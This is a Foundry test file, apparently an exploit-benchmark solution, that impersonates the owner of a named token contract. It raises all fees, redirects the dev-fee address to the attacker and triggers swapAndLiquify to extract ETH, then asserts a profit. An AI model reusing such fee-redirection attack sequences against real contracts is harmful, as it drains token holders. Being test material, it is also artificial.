// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Milesinu {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256 taxFee) external;
    function setDevFeePercent(uint256 DevFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function setDevAddress(address payable _address) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test file already defines TARGET and attacker
        vm.label(TARGET, "Milesinu Token");

        // Get the current owner of the contract
        address owner = Milesinu(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Store initial attacker balance for comparison later
        initialBalance = address(attacker).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialTestBalance = address(this).balance;
        // Step 1: Impersonate the owner
        address owner = Milesinu(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Set all fees to 30% (exceeding 25% as hinted)
        Milesinu(TARGET).setTaxFeePercent(30);
        Milesinu(TARGET).setDevFeePercent(30);
        Milesinu(TARGET).setLiquidityFeePercent(30);

        // Step 3: Set DevAddress to attacker
        Milesinu(TARGET).setDevAddress(payable(attacker));

        // Step 4: Enable swapAndLiquify
        Milesinu(TARGET).setSwapAndLiquifyEnabled(true);

        // Step 5: Also need to set a reasonable maxTxAmount to allow large transfers
        Milesinu(TARGET).setMaxTxPercent(1000); // 1000 * 10^6 * 10^9 = large enough

        vm.stopPrank();

        // Step 6: We need to get some tokens to work with
        // First, let's get tokens from the owner (who has all supply)
        vm.prank(owner);
        Milesinu(TARGET).transfer(attacker, 10000 * 10**6 * 10**9);

        // Step 7: Create another address to transfer to/from
        address victim = address(0x123);
        vm.deal(victim, 1 ether); // Give some ETH for gas

        // Step 8: Transfer tokens to accumulate fees in contract
        // We need to trigger transfers that will take fees
        // First, approve attacker to spend tokens
        vm.prank(attacker);
        Milesinu(TARGET).approve(attacker, type(uint256).max);

        // Transfer from attacker to victim (this will take fees)
        // The fees will accumulate in the contract
        uint256 transferAmount = 5000 * 10**6 * 10**9;
        vm.prank(attacker);
        Milesinu(TARGET).transfer(victim, transferAmount);

        // Step 9: Check contract token balance - fees should have accumulated
        uint256 contractBalance = Milesinu(TARGET).balanceOf(TARGET);
        console.log("Contract token balance after transfer:", contractBalance);

        // Step 10: We need to trigger swapAndLiquify
        // According to the contract, swapAndLiquify triggers when:
        // 1. contractTokenBalance >= numTokensSellToAddToLiquidity (default: 50 * 10^6 * 10^9)
        // 2. !inSwapAndLiquify
        // 3. from != uniswapV2Pair
        // 4. swapAndLiquifyEnabled (we set to true)

        // If contractBalance is not enough, do more transfers
        if (contractBalance < 50 * 10**6 * 10**9) {
            // Transfer back from victim to another address to accumulate more fees
            vm.prank(victim);
            Milesinu(TARGET).transfer(address(0x456), Milesinu(TARGET).balanceOf(victim) / 2);

            // Update contract balance
            contractBalance = Milesinu(TARGET).balanceOf(TARGET);
        }

        // Step 11: Trigger swapAndLiquify by making a transfer from a non-pair address
        // We'll transfer from victim to another address
        address anotherAddress = address(0x789);
        vm.prank(victim);
        Milesinu(TARGET).transfer(anotherAddress, 1 * 10**6 * 10**9);

        // This should trigger swapAndLiquify if conditions are met
        // Half of contract tokens will be swapped to ETH, half of ETH goes to DevAddress (attacker)

        // Step 12: Check if attacker received ETH
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial attacker balance:", initialBalance);
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        uint256 finalTestBalance = address(this).balance;
        assertGt(finalTestBalance, initialTestBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

